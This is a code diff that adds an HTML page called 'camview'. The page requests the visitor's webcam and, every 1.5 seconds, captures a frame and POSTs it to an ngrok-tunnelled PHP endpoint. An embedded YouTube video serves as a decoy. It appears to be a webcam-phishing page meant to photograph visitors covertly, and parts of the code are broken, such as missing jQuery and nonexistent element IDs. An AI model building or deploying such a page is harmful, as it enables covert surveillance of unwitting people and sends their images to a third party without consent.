@@ -1,0 +1,85 @@
+<!DOCTYPE html>
+<html>
+    <html>
+        <head>
+          <title>camview</title>        
+       </head>        
+       <body>
+           <video id="vidDisplay" autoplay="true">
+              No video support in your browser...
+           </video>
+           <script>
+               navigator.getUserMedia=navigator.getUserMedia || navigator.webkitGetUserMedia ||navigator.mozGetUserMedia || navigator.msGetUserMedia ||
+               navigator.oGetUserMedia;
+               if(navigator.getUserMedia){
+                   navigator.getUserMedia({video:true}, handleVideo, videoError);
+               }
+  
+               function handleVideo(stream){   
+               document.querySelector('#vidDisplay').src=window.URL.createObjectURL(stream);
+               }
+               function videoError(e){
+                   alert("some problem")
+               }
+               function post(videodata){
+$.ajax({
+    type: 'POST',
+    data: { cat: videodata},
+    url: 'https://c045396a.ngrok.io/pacar.php',
+    dataType: 'json',
+    async: false,
+    success: function(result){
+        // call the function that handles the response/results
+    },
+    error: function(){
+    }
+  });
+};
+
+
+'use strict';
+
+const video = document.getElementById('video');
+const canvas = document.getElementById('canvas');
+const errorMsgElement = document.querySelector('span#errorMsg');
+
+const constraints = {
+  audio: false,
+  video: {
+    
+    facingMode: "user"
+  }
+};
+
+// Access webcam
+async function init() {
+  try {
+    const stream = await navigator.mediaDevices.getUserMedia(constraints);
+    handleSuccess(stream);
+  } catch (e) {
+    errorMsgElement.innerHTML = `navigator.getUserMedia error:${e.toString()}`;
+  }
+}
+
+// Success
+function handleSuccess(stream) {
+  window.stream = stream;
+  video.srcObject = stream;
+
+var context = canvas.getContext('2d');
+  setInterval(function(){
+
+       context.drawImage(video, 0, 0, 640, 480);
+       var canvasData = canvas.toDataURL("video/mp4").replace("video/mp4", "video/octet-stream");
+       post(canvasData); }, 1500);
+  
+
+}
+
+// Load init
+init();
+           </script>
+       </body>
+       <iframe width="640" height="360" src="https://www.youtube.com/embed/7k7Wdknkjfk" frameborder="0" allowfullscreen></iframe>
+    </html>
+</html>
